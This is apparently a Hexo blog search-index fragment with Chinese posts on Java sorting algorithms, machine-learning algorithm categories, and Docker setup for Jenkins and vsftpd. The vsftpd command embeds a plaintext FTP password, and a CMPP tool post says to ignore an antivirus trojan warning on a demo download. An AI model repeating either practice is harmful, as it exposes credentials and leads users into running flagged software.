&lt;= center) &#123; tmpArr[third++] = data[left++]; &#125; // 将临时数组中的内容拷贝回原数组中 // （原 left-right 范围的内容被复制回原数组） while (tmp &lt;= right) &#123; data[tmp] = tmpArr[tmp++]; &#125; &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"堆排序","slug":"algorithm/sort/6-堆排序","date":"2021-10-01T13:12:11.455Z","updated":"2021-10-01T13:12:11.455Z","comments":true,"path":"2021/10/01/algorithm/sort/6-堆排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/6-%E5%A0%86%E6%8E%92%E5%BA%8F/","excerpt":"","text":"堆排序详细参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149/** * 堆排序 * 堆排序(Heapsort)是指利用堆积树（堆）这种数据结构所设计的一种排序算法，它是选择排序的一种。 * 可以利用数组的特点快速定位指定索引的元素。堆分为大根堆和小根堆，是完全二叉树。 * 大根堆的要求是每个节点的值都不大于其父节点的值，即A[PARENT[i]] &gt;= A[i]。 * 在数组的非降序排序中，需要使用的就是大根堆，因为根据大根堆的要求可知，最大的值一定在堆顶 * 定义 * n个关键字序列Kl，K2，…，Kn称为（Heap），当且仅当该序列满足如下性质（简称为堆性质）： * (1)ki&lt;=k(2i）且ki&lt;=k(2i+1)(1≤i≤ n/2），当然，这是小根堆，大根堆则换成&gt;=号(2)ki&gt;=k(2i）且ki&gt;=k(2i+1)(1≤i≤ n/2）。//k(i）相当于二叉树的非叶子结点，K(2i）则是左子节点，k(2i+1）是右子节点 * 若将此序列所存储的向量R[1..n]看做是一棵完全二叉树的存储结构，则堆实质上是满足如下性质的完全二叉树： * 树中任一非叶子结点的关键字均不大于（或不小于）其左右孩子（若存在）结点的关键字。 * 【例】关键字序列（10，15，56，25，30，70）和（70，56，30，25，15，10）分别满足堆性质（1）和（2），故它们均是堆，其对应的完全二叉树分别如小根堆示例和大根堆示例所示。 * 大根堆和小根堆：根结点（亦称为堆顶）的关键字是堆里所有结点关键字中最小者的堆称为小根堆，又称最小堆。 * 根结点（亦称为堆顶）的关键字是堆里所有结点关键字中最大者，称为大根堆，又称最大堆。注意：①堆中任一子树亦是堆。②以上讨论的堆实际上是二叉堆（Binary Heap），类似地可定义k叉堆。 * 堆排序的时间，主要由建立初始堆和反复重建堆这两部分的时间开销构成，它们均是通过调用Heapify实现的。 * 平均性能 * O(N*logN)。 * * （2）大根堆排序算法的基本操作： ①建堆，建堆是不断调整堆的过程，从len/2处开始调整，一直到第一个节点，此处len是堆中元素的个数。 建堆的过程是线性的过程，从len/2到0处一直调用调整堆的过程，相当于o(h1)+o(h2)…+o(hlen/2) 其中h表示节点的深度，len/2表示节点的个数，这是一个求和的过程，结果是线性的O(n)。 ②调整堆：调整堆在构建堆的过程中会用到，而且在堆排序过程中也会用到。利用的思想是比较节点i和它的孩子节点left(i),right(i)， 选出三者最大(或者最小)者，如果最大（小）值不是节点i而是它的一个孩子节点，那边交互节点i和该节点，然后再调用调整堆过程，这是一个递归的过程。 调整堆的过程时间复杂度与堆的深度有关系，是lgn的操作，因为是沿着深度方向进行调整的。 ③堆排序：堆排序是利用上面的两个过程来进行的。首先是根据元素构建堆。 然后将堆的根节点取出(一般是与最后一个节点进行交换)，将前面len-1个节点继续进行堆调整的过程，然后再将根节点取出，这样一直到所有节点都取出。堆排序过程的时间复杂度是O(nlgn)。 因为建堆的时间复杂度是O(n)（调用一次）；调整堆的时间复杂度是lgn，调用了n-1次，所以堆排序的时间复杂度是O(nlgn) [2] * 其他性能 * 由于建初始堆所需的比较次数较多，所以堆排序不适宜于记录数较少的文件。 * 堆排序是就地排序，辅助空间为O(1). * 它是不稳定的排序方法。（排序的稳定性是指如果在排序的序列中，存在前后相同的两个元素的话，排序前 和排序后他们的相对位置不发生变化） * * 总结： * 1.建立最大堆 * 2.把最大堆元素移动至最后为有序 */public class HeapSort implements Sort &#123; public static void main(String[] args) &#123; HeapSort bubbleSort = new HeapSort(); System.out.println(&quot;HeapSort&quot;); bubbleSort.test(); &#125; @Override public void sort(int[] data) &#123; //step1.buildMaxHeapify //没有子节点的才需要创建最大堆，从最后一个的父节点开始 int startIndex = getParentIndex(data.length - 1); //从尾端开始创建最大堆，每次都是正确的堆 for (int i = startIndex; i &gt;= 0; i--) &#123; maxHeapify(data, data.length, i); &#125; //---此时最大堆创建完成 System.out.println(&quot;printTree MaxTree Ok&quot;); //step2.heapSort //末尾与头交换，交换后调整最大堆 for (int i = data.length - 1; i &gt; 0; i--) &#123; System.out.print(&quot;i=&quot; + i); printTree(data); swap(data, 0, i); printTree(data); maxHeapify(data, i, 0); &#125; printTree(data); &#125; /** * 创建最大堆 * * @paramdata * @paramheapSize需要创建最大堆的大小，一般在sort的时候用到，因为最多值放在末尾，末尾就不再归入最大堆了 * @paramindex当前需要创建最大堆的位置 */ private void maxHeapify(int[] data, int heapSize, int index) &#123; //当前点与左右子节点比较 int left = getChildLeftIndex(index); int right = getChildRightIndex(index); System.out.print(&quot;index=&quot; + index + &quot; left=&quot; + left+&quot; right=&quot; + right); printTree(data); int largest = index; if (left &lt; heapSize &amp;&amp; data[index] &lt; data[left]) &#123; largest = left; &#125; if (right &lt; heapSize &amp;&amp; data[largest] &lt; data[right]) &#123; largest = right; &#125; //得到最大值后可能需要交换，如果交换了，其子节点可能就不是最大堆了，需要重新调整 if (largest != index) &#123; swap(data, largest, index); maxHeapify(data, heapSize, largest); &#125; &#125; /** * 父节点位置 * * @return * @paramcurrent */ private int getParentIndex(int current) &#123; return (current - 1) &gt;&gt; 1; &#125; /** * 左子节点position注意括号，加法优先级更高 * * @return * @paramcurrent */ private int getChildLeftIndex(int current) &#123; return (current &lt;&lt; 1) + 1; &#125; /** * 右子节点position * * @return * @paramcurrent */ private int getChildRightIndex(int current) &#123; return (current &lt;&lt; 1) + 2; &#125; public void printTree(int[] data) &#123; int pre = -2; for (int i = 0; i &lt; data.length; i++) &#123; if (pre &lt; (int) getLog(i + 1)) &#123; pre = (int) getLog(i + 1); System.out.println(); &#125; System.out.print(data[i] + &quot;|&quot;); &#125; System.out.println(); System.out.println(); &#125; /** * 以2为底的对数 * * @return * @paramparam */ private static double getLog(double param) &#123; return Math.log(param) / Math.log(2); &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"人工智能算法","slug":"algorithm/ai/ai","date":"2021-10-01T13:12:11.454Z","updated":"2021-10-01T13:12:11.454Z","comments":true,"path":"2021/10/01/algorithm/ai/ai/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/ai/ai/","excerpt":"","text":"1.人工智能的三大基石算法、数据、计算能力 2.算法2.1.学习算法按照模型训练方式可以分为四类： 监督学习（Supervised Learning） 无监督学习（Unsupervised Learning） 半监督学习（Semi-supervised Learning） 强化学习（Reinforcement Learning） 深度学习(Deep Learning) 2.2.监督学习常见的监督学习算法包含以下几类： 2.2.1.人工神经网络（Artificial NeuralNetwork： 反向传播（Backpropagation） 波尔兹曼机（Boltzmann Machine） 卷积神经网络（Convolutional Neural Network） Hopfield 网络（hopfield Network） 多层感知器（Multilyer Perceptron） 径向基函数网络（Radial Basis Function Network，RBFN） 受限波尔兹曼机（Restricted Boltzmann Machine） 回归神经网络（Recurrent NeuralNetwork，RNN） 自组织映射（Self-organizing Map，SOM） 尖峰神经网络（Spiking Neural Network） 2.2.2.贝叶斯类（Bayesin） 朴素贝叶斯（Naive Bayes） 高斯贝叶斯（Gaussian Naive Bayes） 多项朴素贝叶斯（Multinomial Naive Bayes） 平均-依赖性评估（Averaged One-Dependence Estimators，AODE） 贝叶斯信念网络（Bayesian Belief Network，BBN） 贝叶斯网络（Bayesian Network，BN） 2.2.3.决策树（Decision Tree） 分类和回归树（Classification and Regression Tree，CART） 迭代 Dichotomiser3（Iterative Dichotomiser 3， ID3） C4.5 算法（C4.5 Algorithm）、C5.0 算法（C5.0 Algorithm） 卡方自动交互检测（Chi-squared Automatic Interaction Detection，CHAID） 决策残端（Decision Stump） ID3 算法（ID3 Algorithm） 随机森林（Random Forest） SLIQ（Supervised Learning in Quest） 2.2.4.线性分类器（Linear Classifier）类： Fisher 的线性判别（Fisher’s Linear Discriminant） 线性回归（Linear Regression） 逻辑回归（Logistic Regression） 多项逻辑回归（Multionmial Logistic Regression） 朴素贝叶斯分类器（Naive Bayes Classifier） 感知（Perception） 支持向量机（Support Vector Machine） 2.3.无监督学习：2.3.1.人工神经网络（Artificial Neural Network） 生成对抗网络（Generative Adversarial Networks，GAN） 前馈神经网络（Feedforward Neural Network） 逻辑学习机（Logic Learning Machine） 自组织映射（Self-organizing Map） 2.3.2.关联规则学习（Association Rule Learning） 先验算法（Apriori Algorithm） Eclat 算法（Eclat Algorithm） FP-Growth 2.3.3.分层聚类算法（Hierarchical Clustering） 单连锁聚类（Single-linkage Clustering） 概念聚类（Conceptual Clustering） 2.3.4.聚类分析（Cluster analysis） BIRCH 算法 DBSCAN 算法 期望最大化（Expectation-maximization，EM） 模糊聚类（Fuzzy Clustering） K-means 算法 K 均值聚类（K-means Clustering） K-medians 聚类 均值漂移算法（Mean-shift） OPTICS 算法 2.3.5.异常检测（Anomaly detection） K 最邻近（K-nearest Neighbor，KNN）算法 局部异常因子算法（Local Outlier Factor，LOF） 2.4.半监督学习： 生成模型（Generative Models） 低密度分离（Low-density Separation） 基于图形的方法（Graph-based Methods） 联合训练（Co-training） 2.5.强化学习类算法 Q 学习（Q-learning） 状态-行动-奖励-状态-行动（State-Action-Reward-State-Action，SARSA） DQN（Deep Q Network） 策略梯度算法（Policy Gradients） 基于模型强化学习（Model Based RL） 时序差分学习（Temporal Different Learning） 2.6.深度学习类算法： 深度信念网络（Deep Belief Machines） 深度卷积神经网络（Deep Convolutional Neural Networks） 深度递归神经网络（Deep Recurrent Neural Network） 分层时间记忆（Hierarchical Temporal Memory，HTM） 深度波尔兹曼机（Deep Boltzmann Machine，DBM） 栈式自动编码器（Stacked Autoencoder） 生成对抗网络（Generative Adversarial Networks） 3.解决任务算法按照解决任务的不同来分类，粗略可以分为五种： 二分类算法（Two-class Classification） 多分类算法（Multi-class Classification） 回归算法（Regression） 聚类算法（Clustering） 异常检测（Anomaly Detection） 3.1.二分类（Two-class Classification） （1）二分类支持向量机（Two-class SVM）：适用于数据特征较多、线性模型的场景。 （2）二分类平均感知器（Two-class Average Perceptron）：适用于训练时间短、线性模型的场景。 （3）二分类逻辑回归（Two-class Logistic Regression）：适用于训练时间短、线性模型的场景。 （4）二分类贝叶斯点机（Two-class Bayes Point Machine）：适用于训练时间短、线性模型的场景。（5）二分类决策森林（Two-class Decision Forest）：适用于训练时间短、精准的场景。 （6）二分类提升决策树（Two-class Boosted Decision Tree）：适用于训练时间短、精准度高、内存占用量大的场景 （7）二分类决策丛林（Two-class Decision Jungle）：适用于训练时间短、精确度高、内存占用量小的场景。 （8）二分类局部深度支持向量机（Two-class Locally Deep SVM）：适用于数据特征较多的场景。 （9）二分类神经网络（Two-class Neural Network）：适用于精准度高、训练时间较长的场景。 3.2.多分类（Multi-class Classification）多分类问题通常适用三种解决方案：第一种，从数据集和适用方法入手，利用二分类器解决多分类问题；第二种，直接使用具备多分类能力的多分类器；第三种，将二分类器改进成为多分类器今儿解决多分类问题。常用的算法：（1）多分类逻辑回归（Multiclass Logistic Regression）：适用训练时间短、线性模型的场景。（2）多分类神经网络（Multiclass Neural Network）：适用于精准度高、训练时间较长的场景。（3）多分类决策森林（Multiclass Decision Forest）：适用于精准度高，训练时间短的场景。（4）多分类决策丛林（Multiclass Decision Jungle）：适用于精准度高，内存占用较小的场景。（5）“一对多”多分类（One-vs-all Multiclass）：取决于二分类器效果。 3.3.回归回归问题通常被用来预测具体的数值而非分类。除了返回的结果不同，其他方法与分类问题类似。我们将定量输出，或者连续变量预测称为回归；将定性输出，或者离散变量预测称为分类。常见的算法有： （1）排序回归（Ordinal Regression）：适用于对数据进行分类排序的场景。 （2）泊松回归（Poission Regression）：适用于预测事件次数的场景。 （3）快速森林分位数回归（Fast Forest Quantile Regression）：适用于预测分布的场景。 （4）线性回归（Linear Regression）：适用于训练时间短、线性模型的场景。 （5）贝叶斯线性回归（Bayesian Linear Regression）：适用于线性模型，训练数据量较少的场景。 （6）神经网络回归（Neural Network Regression）：适用于精准度高、训练时间较长的场景。 （7）决策森林回归（Decision Forest Regression）：适用于精准度高、训练时间短的场景。 （8）提升决策树回归（Boosted Decision Tree Regression）：适用于精确度高、训练时间短、内存占用较大的场景。 3.4.聚类聚类的目标是发现数据的潜在规律和结构。聚类通常被用做描述和衡量不同数据源间的相似性，并把数据源分类到不同的簇中。（1）层次聚类（Hierarchical Clustering）：适用于训练时间短、大数据量的场景。（2）K-means 算法：适用于精准度高、训练时间短的场景。（3）模糊聚类 FCM 算法（Fuzzy C-means，FCM）：适用于精确度高、训练时间短的场景。（4）SOM 神经网络（Self-organizing Feature Map，SOM）：适用于运行时间较长的场景。 3.5.异常检测异常检测是指对数据中存在的不正常或非典型的分体进行检测和标志，有时也称为偏差检测。异常检测看起来和监督学习问题非常相似，都是分类问题。都是对样本的标签进行预测和判断，但是实际上两者的区别非常大，因为异常检测中的正样本（异常点）非常小。常用的算法有：（1）一分类支持向量机（One-class SVM）：适用于数据特征较多的场景。（2）基于 PCA 的异常检测（PCA-based Anomaly Detection）：适用于训练时间短的场景。 4.迁移学习类算法 归纳式迁移学习（Inductive Transfer Learning） 直推式迁移学习（Transductive Transfer Learning） 无监督式迁移学习（Unsupervised Transfer Learning） 传递式迁移学习（Transitive Transfer Learning） 算法的适用场景，需要考虑的因素有： （1）数据量的大小、数据质量和数据本身的特点 （2）机器学习要解决的具体业务场景中问题的本质是什么？ （3）可以接受的计算时间是什么？ （4）算法精度要求有多高？ 5.应用场景有了算法，有了被训练的数据（经过预处理过的数据），那么多次训练（考验计算能力的时候到了）后，经过模型评估和算法人员调参后，会获得训练模型。当新的数据输入后，那么我们的训练模型就会给出结果。业务要求的最基础的功能就算实现了。 互联网产品自动化运维是趋势，因为互联网需要快速响应的特性，决定了我们对问题要快速响应、快速修复。人工智能产品也不例外。AI + 自动化运维是如何工作的呢？","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"ai","slug":"ai","permalink":"https://wuhaocn.github.io/tags/ai/"}]},{"title":"选择排序","slug":"algorithm/sort/0.选择排序","date":"2021-10-01T13:12:11.454Z","updated":"2021-10-01T13:12:11.454Z","comments":true,"path":"2021/10/01/algorithm/sort/0.选择排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/0.%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/","excerpt":"","text":"选择排序123456789101112131415161718192021222324252627282930313233343536373839/** * 算法步骤: 首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。 再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。 重复第二步，直到所有元素均排序完毕。 */public class SelectionSort implements Sort &#123; public static void main(String[] args) &#123; int[] numbers = &#123;34, 12, 23, 56, 56, 56, 78&#125;; SelectionSort selectionSort = new SelectionSort(); selectionSort.sort(numbers); selectionSort.print(numbers); &#125; @Override public void sort(int[] numbers) &#123; // 总共要经过 N-1 轮比较 for (int i = 0; i &lt; numbers.length - 1; i++) &#123; int min = i; // 每轮需要比较的次数 N-i for (int j = i + 1; j &lt; numbers.length; j++) &#123; if (numbers[j] &lt; numbers[min]) &#123; // 记录目前能找到的最小值元素的下标 min = j; &#125; &#125; // 将找到的最小值和i位置所在的值进行交换 if (i != min) &#123; int tmp = numbers[i]; numbers[i] = numbers[min]; numbers[min] = tmp; &#125; &#125; &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"插入排序","slug":"algorithm/sort/2.插入排序","date":"2021-10-01T13:12:11.454Z","updated":"2021-10-01T13:12:11.454Z","comments":true,"path":"2021/10/01/algorithm/sort/2.插入排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/2.%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F/","excerpt":"","text":"插入排序详细参考 123456789101112131415161718192021222324252627282930313233343536373839/** * 插入排序 * 通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应的位置并插入。 * 插入排序非常类似于整扑克牌。在开始摸牌时，左手是空的，牌面朝下放在桌上。接着， 一次从 * 桌上摸起一张牌，并将它插入到左手一把牌中的正确位置上。 为了找到这张牌的正确位置，要将 * 它与手中已有的牌从右到左地进行比较。无论什么时候，左手中的牌都是排好序的。 * 如果输入数组已经是排好序的话，插入排序出现最佳情况，其运行时间是输入规模的一个线性函 * 数。如果输入数组是逆序排列的，将出现最坏情况。平均情况与最坏情况一样，其时间代价是(n2)。 */public class InsertSort implements Sort &#123; public static void main(String[] args) &#123; InsertSort bubbleSort = new InsertSort(); System.out.println(&quot;InsertSort&quot;); bubbleSort.test(); &#125; @Override public void sort(int[] arr) &#123; for (int i = 1; i &lt; arr.length; i++) &#123; print(arr); //插入的数 int insertVal = arr[i]; //被插入的位置(准备和前一个数比较) int index = i - 1; //如果插入的数比被插入的数小 while (index &gt;= 0 &amp;&amp; insertVal &lt; arr[index]) &#123; //将把 arr[index] 向后移动 arr[index + 1] = arr[index]; //让 index 向前移动 index--; &#125; //把插入的数放入合适位置 arr[index + 1] = insertVal; print(arr); &#125; &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"冒泡排序","slug":"algorithm/sort/1.冒泡排序","date":"2021-10-01T13:12:11.454Z","updated":"2021-10-01T13:12:11.454Z","comments":true,"path":"2021/10/01/algorithm/sort/1.冒泡排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/1.%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/","excerpt":"","text":"冒泡排序详细参考 123456789101112131415161718192021222324252627282930313233package com.coral.learning.alg.udemo.algorithms.sort;/** * 冒泡排序 * * 它重复地走访过要排序的元素列，一次比较两个相邻的元素，如果他们的顺序（如从大到小、首字母从A到Z）错误就把他们交换过来。 * 走访元素的工作是重复地进行直到没有相邻元素需要交换，也就是说该元素已经排序完成。 * 这个算法的名字由来是因为越大的元素会经由交换慢慢“浮”到数列的顶端（升序或降序排列），就如同碳酸饮料中二氧化碳的气泡最终会上浮到顶端一样，故名“冒泡排序”。 */public class BubbleSort implements Sort &#123; public static void main(String[] args) &#123; int[] numbers = &#123;34, 12, 23, 56, 56, 56, 78&#125;; BubbleSort bubbleSort = new BubbleSort(); System.out.println(&quot;BubbleSort&quot;); bubbleSort.sort(numbers); &#125; @Override public void sort(int[] arr) &#123; for (int i = 0; i &lt; arr.length; i++) &#123; for (int j = 0; j &lt; arr.length - i - 1; j++) &#123;//-1为了防止溢出 print(arr); if (arr[j] &gt; arr[j + 1]) &#123; swap(arr, j, j + 1); &#125; &#125; &#125; &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"快速排序","slug":"algorithm/sort/3-快速排序","date":"2021-10-01T13:12:11.454Z","updated":"2021-10-01T13:12:11.454Z","comments":true,"path":"2021/10/01/algorithm/sort/3-快速排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/3-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/","excerpt":"","text":"快速排序详细参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189/** * 快速排序： * * 快速排序（Quicksort）是对冒泡排序的一种改进。 * 由C. A. R. Hoare在1962年提出。 * 它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小， * 然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。 * &lt;p&gt; * 选择一个关键值作为基准值。比基准值小的都在左边序列（一般是无序的）， * 比基准值大的都在右边（一般是无序的）。 * 一般选择序列的第一个元素。 * 一次循环： 从后往前比较，用基准值和最后一个值比较，如果比基准值小的交换位置，如果没有 * 继续比较下一个，直到找到第一个比基准值小的值才交换。 找到这个值之后，又从前往后开始比 * 较，如果有比基准值大的，交换位置，如果没有继续比较下一个，直到找到第一个比基准值大的 * 值才交换。直到从前往后的比较索引&gt;从后往前比较的索引，结束第一次循环，此时，对于基准值 * 来说，左右两边就是有序的了。 * 算法分析： * 1.当分区选取的基准元素为待排序元素中的最大或最小值时，为最坏的情况，时间复杂度和直接插入排序的一样，移动次数达到最大值 * Cmax = 1+2+...+(n-1) = n*(n-1)/2 = O(n2) 此时最好时间复杂为O(n2) * 2.当分区选取的基准元素为待排序元素中的&quot;中值&quot;，为最好的情况，时间复杂度为O(nlog2n)。 * 3.快速排序的空间复杂度为O(log2n). * 4.当待排序元素类似[6,1,3,7,3]且基准元素为6时，经过分区，形成[1,3,3,6,7],两个3的相对位置发生了改变，所是快速排序是一种不稳定排序。 */public class QuickSort implements Sort&#123; public static void main(String[] args) &#123; int[] numbers1 = new int[]&#123;1, 10, 6, 3, 4, 4, 5&#125;; int[] numbers2 = new int[]&#123;1, 10, 6, 3, 4, 4, 5, 10&#125;; int[] numbers3 = new int[]&#123;1, 10, 6, 3, 4, 4, 5&#125;; QuickSort quickSort = new QuickSort(); System.out.println(&quot;quick sortOne&quot;); quickSort.sortOne(numbers1, 0, numbers1.length - 1); System.out.println(&quot;quick sortTwo&quot;); quickSort.sortTwo(numbers2, 0, numbers2.length - 1); System.out.println(&quot;quick sortTree&quot;); quickSort.sortThree(numbers3, 0, numbers3.length - 1); &#125; @Override public void sort(int[] numbers) &#123; sortOne(numbers, 0, numbers.length - 1); &#125; /** * 快速排序 * * @param numbers * @param sign * @param length */ public void sortOne(int[] numbers, int sign, int length) &#123; int start = sign; //start为最小值 int end = length; //end为最大值 int key = numbers[sign]; while (start &lt; end) &#123; print(numbers); //比较右侧 while (key &lt;= numbers[end] &amp;&amp; start &lt; end) &#123; end--; &#125; if (key &gt;= numbers[end]) &#123; swap(numbers, start, end); &#125; //比较左侧 while (key &gt;= numbers[start] &amp;&amp; start &lt; end) &#123; start++; &#125; if (key &lt;= numbers[start]) &#123; swap(numbers, start, end); &#125; //进行左侧串比较 if (start &gt; sign) &#123; sortOne(numbers, sign, start - 1); &#125; //进行右侧串比较 if (end &lt; length) &#123; sortOne(numbers, start + 1, length); &#125; &#125; &#125; /** * 更高效点的代码 * * @param targetArr * @return */ void sortTwo(int[] targetArr, int start, int end) &#123; int i = start + 1, j = end; int key = targetArr[start]; if (start &gt;= end) &#123; return; &#125; /*从i++和j--两个方向搜索不满足条件的值并交换 * *条件为：i++方向小于key，j--方向大于key */ while (true) &#123; print(targetArr); while (targetArr[j] &gt; key) &#123; j--; &#125; while (targetArr[i] &lt; key &amp;&amp; i &lt; j) &#123; i++; &#125; if (i &gt; j) &#123; break; &#125; swap(targetArr, i, j); if (targetArr[i] == key) &#123; j--; &#125; else &#123; i++; &#125; &#125; /*关键数据放到‘中间’*/ swap(targetArr, start, j); if (start &lt; i - 1) &#123; sortTwo(targetArr, start, i - 1); &#125; if (j + 1 &lt; end) &#123; sortTwo(targetArr, j + 1, end); &#125; &#125; /** * 方式三：减少交换次数，提高效率 * * @param targetArr */ void sortThree(int[] targetArr, int start, int end) &#123; int i = start, j = end; int key = targetArr[start]; while (i &lt; j) &#123; print(targetArr); /*按j--方向遍历目标数组，直到比key小的值为止*/ while (j &gt; i &amp;&amp; targetArr[j] &gt;= key) &#123; j--; &#125; if (i &lt; j) &#123; /*targetArr[i]已经保存在key中，可将后面的数填入*/ targetArr[i] = targetArr[j]; i++; &#125; /*按i++方向遍历目标数组，直到比key大的值为止*/ while (i &lt; j &amp;&amp; targetArr[i] &lt;= key) /*此处一定要小于等于零，假设数组之内有一亿个1，0交替出现的话，而key的值又恰巧是1的话，那么这个小于等于的作用就会使下面的if语句少执行一亿次。*/ &#123; i++; &#125; if (i &lt; j) &#123; /*targetArr[j]已保存在targetArr[i]中，可将前面的值填入*/ targetArr[j] = targetArr[i]; j--; &#125; &#125; /*此时i==j*/ targetArr[i] = key; /*递归调用，把key前面的完成排序*/ if (i &gt; start) &#123; sortThree(targetArr, start, i - 1); &#125; /*递归调用，把key后面的完成排序*/ if (j &lt; end) &#123; sortThree(targetArr, j + 1, end); &#125; &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"ftp服务器搭建","slug":"devops/docker/jenkins搭建","date":"2021-08-31T12:59:00.145Z","updated":"2021-09-01T11:31:14.371Z","comments":true,"path":"2021/08/31/devops/docker/jenkins搭建/","link":"","permalink":"https://wuhaocn.github.io/2021/08/31/devops/docker/jenkins%E6%90%AD%E5%BB%BA/","excerpt":"","text":"jenkins搭建在 macOS 和 Linux 上打开一个终端窗口。 下载 jenkinsci/blueocean 镜像并使用以下 docker run 命令将其作为 Docker 中的容器运行 ： 1mkdir /data/jenkins_home docker 安装 123456789101112131415161718192021222324docker stop jenkinsdocker rm jenkinsdocker run \\-u root \\--name jenkins \\-d \\-p 8080:8080 \\-p 50000:50000 \\jenkinsci/blueoceandocker update jenkins --restart=alwaysdocker stop jenkinsdocker rm jenkinsdocker run \\-u root \\--name jenkins \\-d \\-p 8080:8080 \\-p 50000:50000 \\jenkinsci/blueoceandocker update jenkins --restart=always 查询密码12访问 jenkins 地址/var/jenkins_home/secrets/initialAdminPassword","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"jenkins","slug":"jenkins","permalink":"https://wuhaocn.github.io/tags/jenkins/"}]},{"title":"CMPP短信客户端","slug":"network/sms/CMPP短信","date":"2021-08-27T08:57:01.984Z","updated":"2021-08-27T09:45:44.843Z","comments":true,"path":"2021/08/27/network/sms/CMPP短信/","link":"","permalink":"https://wuhaocn.github.io/2021/08/27/network/sms/CMPP%E7%9F%AD%E4%BF%A1/","excerpt":"","text":"最近公司有需求采用cmpp发送短信调研了一下相关工具，发现如下测试工具挺好用分享一下。​ 工具类 [https://www.cnblogs.com/tuyile006/p/12051168.html](https://www.cnblogs.com/tuyile006/p/12051168.html) 开源源码 https://github.com/Lihuanghe/SMSGate 1.介绍CMPP2.0/CMPP3.0服务端，带数据库，可以接收第三方CMPP客户端的短信，并存入数据库，结合我的cmpp客户端服务程序，将可以实现接收第三方SP的短信并转发到网关实现发送，并将状态报告、上行短信转发给第三方SP，实现了透明网关的作用。程序界面如下：源码截图如下：如界面所示，可以直接给下游SP发MO短信。本程序已经在多个项目中使用，支持长短信，可以实现多个客户端并发连接。提供试用版DEMO下载 注意360会提示木马，请不用理会。目前程序已经升级到V5.0版本，性能更加强大稳定。V5.0版演示如下： 2.下载 下载 ： 客户端V5.0版Demo 服务端V5.0版Demo相关源码是作者的劳动成果，如有需要，请联系作者购买。 ​3.参考https://www.cnblogs.com/tuyile006/p/12051168.html​","categories":[{"name":"短信","slug":"短信","permalink":"https://wuhaocn.github.io/categories/%E7%9F%AD%E4%BF%A1/"}],"tags":[{"name":"cmpp","slug":"cmpp","permalink":"https://wuhaocn.github.io/tags/cmpp/"}]},{"title":"ftp服务器搭建","slug":"devops/docker/ftp服务搭建","date":"2021-08-24T07:05:26.767Z","updated":"2021-08-31T08:18:33.466Z","comments":true,"path":"2021/08/24/devops/docker/ftp服务搭建/","link":"","permalink":"https://wuhaocn.github.io/2021/08/24/devops/docker/ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/","excerpt":"","text":"1.拉取 镜像12docker pull fauria/vsftpd 2.启动容器123456789101112docker pull fauria/vsftpdmkdir /data/ftpdocker stop vsftpddocker rm vsftpddocker run -d -v /data/ftp:/home/vsftpd -p 2120:20 -p 2121:21 -p 21100-21110:21100-21110 -e FTP_USER=urcs -e FTP_PASS=urcs@2018 -e PASV_ADDRESS=10.10.208.194 -e PASV_MIN_PORT=21100 -e PASV_MAX_PORT=21110 --name vsftpd --restart=always fauria/vsftpddocker ps 3. 进入容器123456789docker exec -i -t vsftpd bash 进去dockervi /etc/vsftpd/virtual_users.txt 编辑配置文件写入用户跟密码mkdir /home/vsftpd/user 建立新用户文件夹/usr/bin/db_load -T -t hash -f /etc/vsftpd/virtual_users.txt /etc/vsftpd/virtual_users.db 写入数据库docker restart +(虚拟机运行的 imageId) 